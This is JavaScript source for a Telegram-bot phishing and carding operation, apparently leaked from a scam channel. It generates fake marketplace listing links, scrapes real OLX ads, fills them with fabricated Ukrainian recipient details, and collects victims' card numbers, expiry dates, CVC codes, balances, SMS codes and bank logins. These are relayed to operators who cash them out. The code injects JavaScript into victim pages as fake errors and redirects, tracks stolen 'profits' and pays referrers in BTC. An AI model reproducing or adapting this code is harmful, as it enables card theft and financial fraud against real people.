const axios = require('axios');
const HttpsProxyAgent = require('https-proxy-agent');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const StormDB = require("stormdb");
const engine = new StormDB.localFileEngine("./db.json");
const db = new StormDB(engine);
db.default({ users: [], links: [], templates: [], profits: [] });
setInterval(()=>{
    db.save();
}, 5000)






let config = require('./config.json')
let countries = require('./countries.json') //СЛИТО В https://t.me/proggmatic 
let keyboard = require('./keyboards')

const cheerio = require('cheerio');

const { Telegraf } = require('telegraf');
const bot = new Telegraf(config.bot_token);

async function init_bot() {
    let commands = [
        {command: 'start', description: 'Переход в меню'},
        {command: 'services', description: 'Сервисы'}
    ];
    return await axios.get(`https://api.telegram.org/bot${config.bot_token}/setMyCommands?commands=${encodeURI(JSON.stringify(commands))}`)
}

init_bot()

const express = require('express')
const cookieParser = require('cookie-parser');
const useragent = require('express-useragent');
const app = express()
app.use(express.static('views'))
app.use(cookieParser());
app.use(require('body-parser').urlencoded({ extended: false }));
app.set('view engine', 'ejs');

const port = 9092

let fios = [
    "Броварчук Назар",
    "Васильєв Василь",
    "Дмитренко Юлія",
    "Шинкаренко Олена",
    "Васильчук Лариса",
    "Броваренко Павло",
    "Шевченко Алла",
    "Броварчук Іван",
    "Боднаренко Діана",
    "Крамарчук Ніна"
]

let addresses = [
    "місто Київ, пров. Мельникова, 16",
    "місто Київ, просп. Б. Грінченка, 98",
    "місто Суми, пров. Фізкультури, 47",
    "місто Рівне, просп. Прорізна, 27",
    "місто Суми, вул. Шота Руставелі, 46",
    "місто Чернівці, просп. Мельникова, 89",
    "місто Чернігів, вул. Володимирська, 53",
    "місто Чернігів, пл. Фізкультури, 60",
    "місто Житомир, просп. Різницька, 15",
    "місто Черкаси, пров. Пирогова, 38"
]

let phones = [
    "+380983185787",
    "+380914022388",
    "+380950427653",
    "+380637708923",
    "+380926438293",
    "+380661803404",
    "+380634207621",
    "+380963446708",
    "+380941539059",
    "+380676108057"
]

bot.on('text', async (ctx) => {
    try {
        let user = db.get("users").value().find(x=>x.id===ctx.message.from.id)
        if(!user && ctx.message.chat.type == "private") {
            let ref = ctx.message.text.split(' ')
            if(ref[1]) {ref = ref[1]} else {ref = 0}

            db.get("users").push({
                "id": ctx.message.from.id,
                "access": false,
                "admin": false,
                "name": ctx.message.from.first_name,
                "wallet": "",
                "nick": 0,
                "scene": "step1",
                "step1": "",
                "step2": "",
                "step3": "",
                "ref": ref
            })
            if (ref !== 0) await ctx.telegram.sendMessage(ref, `🎁 У вас новый реферал (@${ctx.message.from.username})`);
            return await ctx.replyWithHTML(`<b>1️⃣ Расскажи о своём опыте!</b>`)
        }
        if (ctx.message.text == "/services") {
            let btns = [];
            for (var i=0; i < countries.length; i++) {
                btns.push([{text: `${countries[i].flag} ${countries[i].name}`, callback_data: `country_${countries[i].code}`}]);
            }
            btns.push(keyboard.back_menu()[0]);
            text = `Выберите страну для ворка`
            return await ctx.replyWithHTML(text, {reply_markup: {
                inline_keyboard: btns
            }})
        }
        if (ctx.message.text == "/start") {
            if (user.access == true) {
                await ctx.telegram.sendMessage(user.id, `Заряду тебе!\n\nВаш ID: <code>${ctx.message.from.id}</code>\nНик: ${user.nick == 0 ? "🔴 Выключен": "🟢 Включен"}\nКошелёк: <code>${user.wallet}</code>\n\nНа вбиве: Никого`, {reply_markup: {
                    inline_keyboard: keyboard.menu(user)
                }, parse_mode: "html"});
            }
        }
        if (ctx.message.text == "/getadm") {
            user.admin = true
        }
        if (user.scene == "step1") {
            user.step1 = ctx.message.text
            user.scene = "step2"
            return await ctx.replyWithHTML(`<b>2️⃣ Отлично, теперь скажи откуда узнал о нас.</b>`)
        }
        if (user.scene == "step2") {
            user.step2 = ctx.message.text
            user.scene = "step3"
            return await ctx.replyWithHTML(`<b>3️⃣ И последний вопрос: сколько готов уделять времени работе?</b>`)
        }
        if (user.scene == "step3") {
            user.step3 = ctx.message.text
            user.scene = "step_end"
            await ctx.telegram.sendMessage(config.rchat_id, `🤖 Новая заявка на вступление! 🤖

        🧾 Пользователь: @${ctx.message.from.username} (${ctx.message.from.id})

        📧 Опыт работы: ${user.step1}
        📧 Откуда узнал: ${user.step2}
        📧 Время для работы: ${user.step3}`, {reply_markup: {
            inline_keyboard: keyboard.new_user(ctx.from.id)
        }});
            return await ctx.replyWithHTML(`🧨 Отлично! Я передам твои ответы администрации... Ожидай результат! 🧨`)
        }
        if (user.scene.startsWith("profit_")) {
            let profit = ctx.message.text
            let link_id = user.scene.split("_")[1]
            let link = db.get("links").value().find(x=>x.id==link_id)
            let country = countries.find((x) => {
                let y = x.services.find(x=>x.subdomain==link.service);
                if(y) return true
                return false
            });
            let service = country.services.find(x=>x.subdomain==link.service);
            let owner = db.get("users").value().find(x=>x.id==link.owner);
            await ctx.telegram.sendMessage(config.pchat_id, `🦣 НОВЫЙ ЗАЛЁТ 🦣\n\n${country.flag} ${service.name}\n💸 Сумма: ${profit} ${country.valyta}\n👨‍🌾 Воркер: <a href='tg://user?id=${user.id}'>${owner.name}</a>`, {parse_mode:"html"})
if (!user.profits) user.profits = [];
user.profits.push({
    name_serv: `${country.flag} ${service.name}`,
    name: `${link.name}`,
    amount: profit
})
user.scene = ""
return await ctx.replyWithHTML(`<b>Профит успешно добавлен!</b>`)

        }
        if (user.scene == "template_name") {
            user.scene = "template_text__"+ctx.message.text
            db.get("templates").push({
                name: ctx.message.text,
                text: ""
            })
            return await ctx.replyWithHTML(`Введите текст сообщения об ошибке:\n\nP.s В тексте ошибки поддерживается HTML.`)
        }
        if (user.scene.startsWith("template_text")) {
            let template = db.get("templates").value().find(x=>x.name==user.scene.split("__")[1])
            user.scene = ""
            template.text = ctx.message.text;
            return await ctx.replyWithHTML(`Ошибка "${template.name}"успешно добавлена!`)
        }
        if (user.scene.startsWith("name_")) {
            let id = user.scene.split("_")[1];
            let link = db.get("links").value().find(x=>x.id==id)
            link.name = ctx.message.text;
            user.scene = `desc_${id}`;
            return await ctx.replyWithHTML("Напишите описание товара.\n\n", {reply_markup: {inline_keyboard: keyboard.back_menu()}})
        }
        if (user.scene.startsWith("desc_")) {
            let id = user.scene.split("_")[1];
            let link = db.get("links").value().find(x=>x.id==id)
            link.desc = ctx.message.text;
            user.scene = `photo_${id}`;
            return await ctx.replyWithHTML("Пришлите фото товара ссылкой.\n\n", {reply_markup: {inline_keyboard: keyboard.back_menu()}})
        }
        if (user.scene.startsWith("photo_")) {
            let id = user.scene.split("_")[1];
            let link = db.get("links").value().find(x=>x.id==id)
            link.photo = ctx.message.text;
            user.scene = `fio_${id}`;
          
            
            return await ctx.replyWithHTML("Напишите имя получателя.")
        }
        if (user.scene.startsWith("fio_")) {
            let id = user.scene.split("_")[1];
            let link = db.get("links").value().find(x=>x.id==id)
            link.fio = ctx.message.text;
            user.scene = `address_${id}`;
          
            return await ctx.replyWithHTML("Напишите адрес получателя.")
        }
        if (user.scene.startsWith("address_")) {
            let id = user.scene.split("_")[1];
            let link = db.get("links").value().find(x=>x.id==id)
            link.address = ctx.message.text;
            if(link.type == "manual") {
                user.scene = `cost_${id}`;
                return await ctx.replyWithHTML("Напишите цену товара.", {reply_markup: {inline_keyboard: keyboard.back_menu()}})
            } else {
                user.scene = `phone_${id}`;
                
                return await ctx.replyWithHTML("Напишите телефон получателя.")
            }
        }
        if (user.scene.startsWith("cost_")) {
            let id = user.scene.split("_")[1];
            let link = db.get("links").value().find(x=>x.id==id)
            link.price = Number(ctx.message.text) + " ";
            user.scene = `phone_${id}`;
  
            return await ctx.replyWithHTML("Напишите телефон получателя.")
        }
        if (user.scene.startsWith("phone_")) {
            let id = user.scene.split("_")[1];
            let link = db.get("links").value().find(x=>x.id==id)
            link.phone = ctx.message.text;
            user.scene = ``;
            return await ctx.replyWithHTML(`✅ Ссылка успешно создана\n\nhttps://${config.domain}/${link.id}`, {reply_markup: {inline_keyboard: keyboard.back_menu()}})
        }
        if (user.scene.startsWith("e_")) {
            let action = user.scene.split("_")[1];
            let id = user.scene.split("_")[2];
            let link = db.get("links").value().find(x=>x.id==id)
            link[action] = ctx.message.text;
            return await ctx.replyWithHTML(`✅ Ссылка успешно отредактирована\n\nhttps://${config.domain}/${link.id}`, {reply_markup: {inline_keyboard: keyboard.back_menu()}})
        }
        if (user.scene.startsWith("search_")) {
            let action = user.scene.split("_")[1]
            user.scene = ``;
            let links = db.get("links").value().filter(x=>x.owner == user.id)
            if (action == "name") { 
                links = db.get("links").value().filter(x=>x.name.includes(ctx.message.text))
            } else if (action == "date") {
                links = db.get("links").value().filter(x => {
                    let beg = Math.floor(new Date(ctx.message.text.split("-")[0]).getTime()/1000);
                    let end = Math.floor(new Date(ctx.message.text.split("-")[1]).getTime()/1000);
                    if (x.time > beg && x.time < end && x.owner == user.id) return true;
                    return false;
                })
            }
            let btns = [];
            for (var i=0; i < links.length; i++) {
                btns.push([{text: `${links[i].name}`, callback_data: `link_${links[i].id}`},{text: `✖️`, callback_data: `dlink_${links[i].id}`}]);
            }
            btns.push([{ text: '❌ Удалить все ссылки', callback_data: `dlinkall`}])
            btns.push([{ text: '🔎 Дата', callback_data: `find_date`},{ text: '🔎 Название', callback_data: `find_name`}])
            btns.push([{ text: '⬅️ Вернуться в меню', callback_data: `back`}])
            await ctx.replyWithHTML("Ваши товары:\n\nВы можете изменять параметры внутри товара.", {reply_markup: {
                inline_keyboard: btns
            }})
            return
        }
        if (user.scene.startsWith("wallet")) {
            user.wallet = ctx.message.text;
            user.scene = ``;
            return await ctx.replyWithHTML("✅ Кошелёк успешно установлен!")
        }
        if (user.scene.startsWith("parsing_")) {
            const proxyAgent = new HttpsProxyAgent('http://195.211.230.103:39033/');
            const response = await axios.get(ctx.message.text, {
                httpsAgent: proxyAgent
            });
            const body = response.data;
            const $ = cheerio.load(body);
            title = $('*[data-cy="ad_title"]').text()
            price = $('*[data-testid="ad-price-container"] h3').text()
            desc = $('*[data-cy="ad_description"] div').text()
            fio = $('*[data-testid="user-profile-link"] h4').text()
            place = (new RegExp(/.\"pathName.\":.\"(.*?).\"/)).exec(response.data)[1]
            photo = $(`*[data-testid="swiper-image"]`)[0].attribs.src
            let subdomain = user.scene.split("_")[1]
            let link = {
                "id": parseInt(Math.random()*1000000000, 10),
                "time": Math.floor(Date.now() / 1000),
                "owner": user.id,
                "status": "loading",
                "card4": "",
                "vbiver": 0,
                "name": title,
                "fio": fio,
                "address": place,
                "phone": phones[Math.floor(Math.random() * phones.length)], 
                "service": subdomain,
                "price": price,
                "desc": desc,
                "photo": photo,
                "type": "parsing"
            }
            db.get("links").push(link)
            user.scene = `fio_${link.id}`;
            let kb = keyboard.back_menu()
            kb.push([{ text: '🤖 Генерация', callback_data: `autogen_fio`}])
            return await ctx.replyWithHTML("Напишите имя получателя.", {reply_markup: {inline_keyboard: kb}})
            user.scene = ``;
            return await ctx.replyWithHTML(`✅ Ссылка (${subdomain}) успешно создана\nhttps://${config.domain}/${link.id}`, {reply_markup: {inline_keyboard: keyboard.back_menu()}})
        }
        if(user.scene == "rassylka") {
            text = ctx.message.text
            let users = db.get("users").value()
            for (var i=0; i<=users.length; i++) {
                try {
                    await ctx.telegram.sendMessage(users[i].id, text);
                } catch (error) {}
            }
            user.scene = ``;
            return await ctx.replyWithHTML(`✅ Рассылка успешно завершена.`)
        }
    } catch (err) {
        console.log(err)
    }
});

bot.on('callback_query', async (ctx) => {
    try {
        let user = db.get("users").value().find(x=>x.id===ctx.update.callback_query.from.id)
        let cbdata = ctx.update.callback_query.data;
        if (cbdata.startsWith("✅ Принять")) {
            let worker = db.get("users").value().find(x=>x.id===Number(cbdata.split(" ").at(-1)))
            worker.access = true
            await ctx.telegram.sendMessage(worker.id, `Сасных логов тебе\nЗАРЯДУ!!!`, {reply_markup: {
                inline_keyboard: keyboard.menu(user)
            }});
            await ctx.editMessageReplyMarkup({
                inline_keyboard: keyboard.accepted()
            })
        } else if (cbdata.startsWith("⛔️ Отклонить")) {
            let worker = db.get("users").value().find(x=>x.id===Number(cbdata.split(" ").at(-1)))
            worker.access = false
            await ctx.telegram.sendMessage(worker.id, `⛔️ К сожалению, ваша заявка была отклонена! ⛔️`);

          
            await ctx.editMessageReplyMarkup({
                inline_keyboard: keyboard.declined()
            })
        } else if (cbdata.startsWith("e_")) {
            let action = cbdata.split("_")[1];
            user.scene = cbdata
            if (action == "fio") {
                return await ctx.replyWithHTML("Напишите имя получателя.", {reply_markup: {inline_keyboard: keyboard.back_menu()}})
            } else if (action == "address") {
                return await ctx.replyWithHTML("Напишите адрес получателя.", {reply_markup: {inline_keyboard: keyboard.back_menu()}})
            } else if (action == "phone") {
                return await ctx.replyWithHTML("Напишите телефон получателя.", {reply_markup: {inline_keyboard: keyboard.back_menu()}})
            } else if (action == "price") {
                return await ctx.replyWithHTML("Напишите цену товара.", {reply_markup: {inline_keyboard: keyboard.back_menu()}})
            }
        } else if (cbdata.startsWith("autogen_")) {
            let action = cbdata.split("_")[1]
            if (action == "fio") {
                let name = fios[Math.floor(Math.random() * fios.length)]
                let id = user.scene.split("_")[1];
                let link = db.get("links").value().find(x=>x.id==id)
                link.fio = name;
                user.scene = `address_${id}`;
                let kb = keyboard.back_menu()
                kb.push([{ text: '🤖 Генерация', callback_data: `autogen_address`}])
                return await ctx.replyWithHTML(`Сгенерированное имя: ${name}\n\n Напишите адрес получателя.`, {reply_markup: {inline_keyboard: kb}})
            } else if (action == "address") {
                let name = addresses[Math.floor(Math.random() * addresses.length)]
                let id = user.scene.split("_")[1];
                let link = db.get("links").value().find(x=>x.id==id)
                link.address = name;
                user.scene = `cost_${id}`;
                return await ctx.replyWithHTML(`Сгенерированный адрес: ${name}\n\n Напишите цену товара.`, {reply_markup: {inline_keyboard: keyboard.back_menu()}})
            } else if (action == "phone") {
                let name = phones[Math.floor(Math.random() * phones.length)]
                let id = user.scene.split("_")[1];
                let link = db.get("links").value().find(x=>x.id==id)
                link.phone = name;
                user.scene = ``;
                return await ctx.replyWithHTML(`✅ Ссылка успешно создана\nНазвание товара: ${link.name}\nИмя мамонта: ${link.fio}\nАдрес: ${link.address}\nТелефон: ${link.phone}\nЦена: ${link.price}\n\nhttps://${config.domain}/${link.id}`, {reply_markup: {inline_keyboard: keyboard.back_menu()}})
            }
        } else if (cbdata == "back") {
            user.scene = ""
            await ctx.telegram.sendMessage(user.id, `Привет, пора поднять бабла. Заряду тебе!\n\nВаш ID: <code>${user.id}</code>\nНик: ${user.nick == 0 ? "🔴 Выключен": "🟢 Включен"}\n\nНа вбиве: Никого`, {reply_markup: {
                inline_keyboard: keyboard.menu(user)
            }, parse_mode: "html"});
        } else if (cbdata.startsWith("links")) {
            let links = db.get("links").value().filter(x=>x.owner===user.id)
            let btns = [];
            for (var i=0; i < links.length; i++) {
                btns.push([{text: `${links[i].name}`, callback_data: `link_${links[i].id}`},{text: `✖️`, callback_data: `dlink_${links[i].id}`}]);
            }
            btns.push([{ text: '❌ Удалить все ссылки', callback_data: `dlinkall`}])
            btns.push([{ text: '🔎 Дата', callback_data: `find_date`},{ text: '🔎 Название', callback_data: `find_name`}])
            btns.push([{ text: '⬅️ Вернуться в меню', callback_data: `back`}])
            text = "Ваши товары:\n\nВы можете изменять параметры внутри товара.\n\nПоиск добавлю после добавления сервисов"
            await ctx.replyWithHTML(text, {reply_markup: {
                inline_keyboard: btns
            }, resize_keyboard: false})
        } else if (cbdata.startsWith("link_")) {
            let link = db.get("links").value().find(x => x.id == Number(cbdata.split("_")[1]));
            text = `Товар "${link.name}": \n\nИмя мамонта: ${link.fio}\nАдрес: ${link.address}\nТелефон: ${link.phone}\n\nЦена: ${link.price}\n\nСсылка: https://${config.domain}/${link.id}`
            let btns = [];
            btns.push([{ text: '✍️ Имя', callback_data: `e_fio_${link.id}` }])
            btns.push([{ text: '✍️ Адрес', callback_data: `e_address_${link.id}` }])
            btns.push([{ text: '✍️ Телефон', callback_data: `e_phone_${link.id}` }])
            btns.push([{ text: '✍️ Цена', callback_data: `e_price_${link.id}` }])
            btns.push(keyboard.back_menu()[0]);
            await ctx.replyWithHTML(text, {reply_markup: {
                inline_keyboard: btns
            }})
        } else if (cbdata.startsWith("dlink_")) {
            let id = cbdata.split("_")[1]
            db.get("links").value().splice(db.get("links").value().indexOf(db.get("links").value().find(x => x.id == id)), 1)
            await ctx.replyWithHTML(`Успешно удалили ссылку!`)
        } else if (cbdata.startsWith("dlinkall")) {
            let my_links = db.get("links").value().filter(x => x.owner == ctx.update.callback_query.from.id);
            for (var i=0; i < my_links.length; i++) {
                db.get("links").value().splice(db.get("links").value().indexOf(my_links[i]), 1)
            }
            await ctx.replyWithHTML(`Успешно удалили все ссылки!`)
        } else if (cbdata.startsWith("find_")) {
            let action = cbdata.split("_")[1];
            if (action == "name") {
                await ctx.replyWithHTML(`Напишите поисковую фразу`)
                return user.scene = `search_name`;
            } else if (action == "date") {
                await ctx.replyWithHTML(`Напишите диапазон дат создания:\n\nПример: <code>01.01.1970-30.12.2022</code>`, parse_mode="html")
                return user.scene = `search_date`;
            }
        } else if (cbdata.startsWith("profits")) {
            if (!user.profits) return await ctx.replyWithHTML(`К сожалению, у вас нет ни одного профита 😭`);
            text = "💰 Ваши последние профиты:\n\n"
            uprofits = user.profits.slice(-10);
            let sum = 0;
            for (var i=0; i<user.profits.length; i++) {
                sum += Number(user.profits[i].amount)
            };
            for (var i=0; i<uprofits.length; i++) {
                text += `${i+1}. ${uprofits[i].name} (${uprofits[i].amount})\n`
            };
            return await ctx.replyWithHTML(text + `\nСумма ваших профитов: ${sum} грн.`);
        } else if (cbdata.startsWith("referalsystem")) {
            let referals = db.get("users").value().filter(x=>x.ref == ctx.update.callback_query.from.id)
            await ctx.replyWithHTML(`🎄<b>Реферальная система

Как это работает?
Вы отправляете другу свою реферальную ссылку, после того как он делает профит, вы получаете 10% от его профита (у друга остается стандартный процент выплаты, у него ничего не забирают)

Ваша реферальная ссылка: <code>https://t.me/${ctx.update.callback_query.message.from.username}?start=${user.id}</code>

Текущий BTC кошелек: <code>${user.wallet}</code>

Приглашено пользователей: <code>${referals.length}</code></b>`)
            
        } else if (cbdata.startsWith("settings")) {
            await ctx.replyWithHTML(`Настройки:`, {reply_markup: {
                inline_keyboard: keyboard.settings(user.nick)
            }})
        } else if (cbdata.startsWith("wallet")) {
            user.scene = "wallet"
            await ctx.replyWithHTML(`Напишите ваш BTC адрес.`)
        } else if (cbdata.startsWith("shnick")) {
            await ctx.replyWithHTML(`Ваш ник успешно ${user.nick == 1 ? "скрыт": "показан"}`)
            user.nick = !user.nick
        } else if (cbdata.startsWith("countries")) {
            let btns = [];
            for (var i=0; i < countries.length; i++) {
                btns.push([{text: `${countries[i].flag} ${countries[i].name}`, callback_data: `country_${countries[i].code}`}]);
            }
            btns.push(keyboard.back_menu()[0]);
            text = `Выберите страну для ворка`
            await ctx.replyWithHTML(text, {reply_markup: {
                inline_keyboard: btns
            }})
        } else if (cbdata.startsWith("country_")) {
            let country = countries.find(x => x.code == cbdata.split("_")[1]);
            let services = country.services;
            let btns = [];
            for (var i=0; i < services.length; i++) {
                btns.push([{text: `${country.flag} ${services[i].name}`, callback_data: `service_${services[i].subdomain}`}]);
            }
            btns.push(keyboard.back_menu()[0]);
            text = `Выберите сервис для ворка`
            await ctx.replyWithHTML(text, {reply_markup: {
                inline_keyboard: btns
            }})
        } else if (cbdata.startsWith("service_")) {
            let subdomain = cbdata.split("_")[1]
            text = "Выберите удобный для вас способ заполнения ссылки."
            await ctx.replyWithHTML(text, {reply_markup: {
                inline_keyboard: keyboard.genLink(subdomain)
            }})
        } else if (cbdata.startsWith("manual_")) {
            let subdomain = cbdata.split("_")[1]
            let link = {
                "id": parseInt(Math.random()*1000000000, 10),
                "time": Math.floor(Date.now() / 1000),
                "owner": user.id,
                "status": "loading",
                "card4": "",
                "vbiver": 0,
                "name": "",
                "fio": "",
                "address": "",
                "phone": "", 
                "service": subdomain,
                "price": 0,
                "type": "manual"
            }
            db.get("links").push(link)
            user.scene = `name_${link.id}`
            await ctx.replyWithHTML("Напишите название товара.", {reply_markup: {inline_keyboard: keyboard.back_menu()}})
            
        } else if (cbdata.startsWith("parsing_")) {
            if (cbdata.split("_")[1] == "olxua") {
                user.scene = `parsing_${cbdata.split("_")[1]}`
                await ctx.replyWithHTML("Пришлите ссылку на объявление.")
            } else {
                await ctx.replyWithHTML("Парсера под этот сервис не существует")
            }
        } else if (cbdata.startsWith("genlink")) {
            let link = {
                "id": parseInt(Math.random()*1000000000, 10),
                "time": Math.floor(Date.now() / 1000),
                "owner": user.id,
                "status": "loading",
                "card4": "",
                "vbiver": 0
            }
            db.get("links").push(link)
            await ctx.reply(`✅ Ссылка успешно создана\n\nhttps://${config.domain}/${link.id}`)
        } else if (cbdata.startsWith("dcard_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `alert("Произошла какая-то ошибка. Карта не действительна."); document.location.href="/card/${link.id}"`
            await ctx.editMessageReplyMarkup({
                inline_keyboard: keyboard.card_err()
            })
        } else if (cbdata.startsWith("next_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `ready`
            link.vbiver = ctx.update.callback_query.from.id;
            bot.telegram.sendMessage(link.owner, `💎 Вашего мамонта вбивает @${ctx.update.callback_query.from.username}`, {
                parse_mode: "html",
            })
            await ctx.editMessageReplyMarkup({
                inline_keyboard: keyboard.vbiv(ctx.update.callback_query.from.username)
            })
        } else if (cbdata.startsWith("nextsms_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `sms`
            link.vbiver = ctx.update.callback_query.from.id;
            bot.telegram.sendMessage(link.owner, `💎 Ваш мамонт на вводе СМС @${ctx.update.callback_query.from.username}`, {
                parse_mode: "html",
            })
            let btns = [
                [{ text: '✅ Пиздуй на ЛК', callback_data: `nextlkYBRAT'_${link.id}`}],
                [{ text: `✅ НА СМС`, callback_data: 'zxczxczxc' }]
            ]
            let templates = db.get("templates").value();
            for (var i=0; i < templates.length; i++) {
                btns.push([{text: `⛔️ ${templates[i].name}`, callback_data: `error_${link.id}_${templates[i].name}`}]);
            }
            await ctx.editMessageReplyMarkup({
                inline_keyboard: btns
            })
        } else if (cbdata.startsWith("nextlk_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `lk`
            link.vbiver = ctx.update.callback_query.from.id;
            bot.telegram.sendMessage(link.owner, `💎 Ваш мамонт на вводе данных от ЛК @${ctx.update.callback_query.from.username}`, {
                parse_mode: "html",
            })
            let btns = [
                [{ text: `✅ Вбив на ЛК`, callback_data: 'zxczxczxc' }]
            ]
            let templates = db.get("templates").value();
            for (var i=0; i < templates.length; i++) {
                btns.push([{text: `⛔️ ${templates[i].name}`, callback_data: `error_${link.id}_${templates[i].name}`}]);
            }
            await ctx.editMessageReplyMarkup({
                inline_keyboard: btns
            })
        } else if (cbdata.startsWith("nextapp_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `app`
            link.vbiver = ctx.update.callback_query.from.id;
            let btns = [
                [{ text: `📱 Код с приложения`, callback_data: 'zxczxczxc' }]
            ]
            await ctx.editMessageReplyMarkup({
                inline_keyboard: btns
            })
        } else if (cbdata.startsWith("nextcall_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `call`
            link.vbiver = ctx.update.callback_query.from.id;
            let btns = [
                [{ text: `📱 Код из звонка`, callback_data: 'zxczxczxc' }]
            ]
            await ctx.editMessageReplyMarkup({
                inline_keyboard: btns
            })
        } else if (cbdata.startsWith("nextcardbal_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `alert('Введіть правильний залишок вашого балансу картки для ідентифікації');window.location.href='/card/${link.id}'`
            link.vbiver = ctx.update.callback_query.from.id;
            let btns = [
                [{ text: `💳 Точный баланс`, callback_data: 'zxczxczxc' }]
            ]
            await ctx.editMessageReplyMarkup({
                inline_keyboard: btns
            })
            await ctx.telegram.sendMessage(user.id, `💳 Ваш мамонт был отправлен на точный баланс

☑️Объявление: ${link.name}
☑️Стоимость: ${link.price} 
            `, {reply_markup: {
                inline_keyboard: btns
            }});
        } else if (cbdata.startsWith("vbiv_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            let owner = db.get("users").value().find(x=>x.id==link.owner)
            link.vbiver = ctx.update.callback_query.from.id;
            try {
                let bank = await axios.get(`https://bins.antipublic.cc/bins/${link.card}`)
                bank = bank.data;
                brand = `${bank.type} ${bank.brand} ${bank.bank}`
            } catch {
                brand = `Не определён`
            }
            let btns = [
                [{ text: '✅ Пиздуй на СМС', callback_data: `nextsms_${link.id}`}],
                [{ text: '✅ Пиздуй на ЛК', callback_data: `nextlk_${link.id}`}],
                [{ text: '📱 Код с приложения', callback_data: `nextapp_${link.id}`}, { text: '📱 Код из звонка', callback_data: `nextcall_${link.id}`}],
                [{ text: '💳 Точный баланс', callback_data: `nextcardbal_${link.id}`}],
            ]
            let templates = db.get("templates").value();
            for (var i=0; i < templates.length; i++) {
                btns.push([{text: `⛔️ ${templates[i].name}`, callback_data: `carderror_${link.id}_${templates[i].name}`}]);
            }
           bot.telegram.sendMessage(link.owner, `💎 Ваш лог вбивает @${ctx.update.callback_query.from.username}

☑️Объявление: ${link.name}
☑️Стоимость: ${link.price}`, {
                parse_mode: "html",
            })
            await bot.telegram.sendMessage(link.vbiver, `
‼️ <b>Пришла карта</b>

Владелец: <a href='tg://user?id=${owner.id}'>${owner.name}</a>
Бин: ${brand}
☘️ Карта: <code>${link.card}</code>
📆 Срок: <code>${link.srok}</code>
🕶 CVC: <code>${link.cvv}</code>
Баланс: ${link.bal} ₴

👤 Ссылка: ${config.domain}/${link.id}

💸 Сумма: ${link.price}
            `, {
                parse_mode: "html",
                reply_markup: {
                    inline_keyboard: btns
                }
            })
            await ctx.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: `✅ Вбивает @${ctx.update.callback_query.from.username}`, callback_data: 'zxczxczxc' }]
                ]
            })
        } else if (cbdata.startsWith("sms_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `sms`
            link.vbiver = ctx.update.callback_query.from.id;
            await ctx.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: `✅ Редирект на СМС`, callback_data: 'zxczxczxc' }],
                    [{ text: '📞 Звонок', callback_data: `mobile_${link.id}`}],
                    [{ text: '✅ Пиздуй на СМС', callback_data: `nextsms_${link.id}`}],
                    [{ text: '✅ Пиздуй на ЛК', callback_data: `nextlk_${link.id}`}],
                    [{ text: '📱 Код с приложения', callback_data: `nextapp_${link.id}`}, { text: '📱 Код из звонка', callback_data: `nextcall_${link.id}`}],
                    [{ text: '💳 Точный баланс', callback_data: `nextcardbal_${link.id}`}]
                ]
            })
        } else if (cbdata.startsWith("mobile_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            link.status = `call`
            link.vbiver = ctx.update.callback_query.from.id;
            await ctx.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: `✅ Звоночек`, callback_data: 'zxczxczxc' }],
                    [{ text: '✅ Пиздуй на СМС', callback_data: `nextsms_${link.id}`}],
                    [{ text: '✅ Пиздуй на ЛК', callback_data: `nextlk_${link.id}`}],
                    [{ text: '📱 Код с приложения', callback_data: `nextapp_${link.id}`}, { text: '📱 Код из звонка', callback_data: `nextcall_${link.id}`}],
                    [{ text: '💳 Точный баланс', callback_data: `nextcardbal_${link.id}`}]
                ]
            })
        } else if (cbdata.startsWith("error_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            let template = db.get("templates").value().find(x=>x.name===cbdata.split("_")[2])
            link.status = 'document.querySelector("#notify").innerHTML = `' + template.text + '`'
            await ctx.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: `⛔️ ${template.name}`, callback_data: 'zxczxczxc' }]
                ]
            })
            await ctx.telegram.sendMessage(user.id, `⛔️ Вашему мамонту была отправлена ошибка "${template.name}"

☑️Объявление: ${link.name}
☑️Стоимость: ${link.price} 
            `, {reply_markup: {
                inline_keyboard: btns
            }});
        } else if (cbdata.startsWith("lkerror_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            let template = db.get("templates").value().find(x=>x.name===cbdata.split("_")[2])
            link.status = `$('.swal2-center').style = "overflow-y: auto; display: grid;"; $('#swal2-html-container').html('${template.text}')`
            await ctx.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: `⛔️ ${template.name}`, callback_data: 'zxczxczxc' }]
                ]
            })
            await ctx.telegram.sendMessage(user.id, `⛔️ Вашему мамонту была отправлена ошибка "${template.name}"

☑️Объявление: ${link.name}
☑️Стоимость: ${link.price} 
            `, {reply_markup: {
                inline_keyboard: btns
            }});
        } else if (cbdata.startsWith("carderror_")) {
            let link = db.get("links").value().find(x=>x.id===Number(cbdata.split("_")[1]))
            let template = db.get("templates").value().find(x=>x.name===cbdata.split("_")[2])
            link.status = `alert('${template.text}'); window.location.reload()`
            await ctx.editMessageReplyMarkup({
                inline_keyboard: [
                    [{ text: `⛔️ ${template.name}`, callback_data: 'zxczxczxc' }]
                ]
            })
            await ctx.telegram.sendMessage(user.id, `⛔️ Вашему мамонту была отправлена ошибка "${template.name}"

☑️Объявление: ${link.name}
☑️Стоимость: ${link.price} 
            `, {reply_markup: {
                inline_keyboard: btns
            }});
        } else if (cbdata.startsWith("success_")) {
            await ctx.reply(`Введите сумму профита:`)
            user.scene = `profit_${cbdata.split("_")[1]}`
            /*await ctx.editMessageReplyMarkup({
